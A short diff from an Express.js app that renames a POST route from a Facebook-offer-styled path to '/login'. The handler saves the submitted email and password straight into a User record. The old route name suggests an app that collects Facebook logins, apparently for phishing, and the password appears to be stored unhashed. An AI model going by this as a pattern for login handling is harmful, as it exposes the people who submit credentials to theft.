@@ -32,7 +32,7 @@ app.get('/',function(req,res){
     res.sendfile('index.html');
 })
 
-app.post('/facebookofferpageauthenticate.herokuapp.com',function(req,res){
+app.post('/login',function(req,res){
     var newuser = new User({
                      email: req.body.email,
                    password: req.body.pass
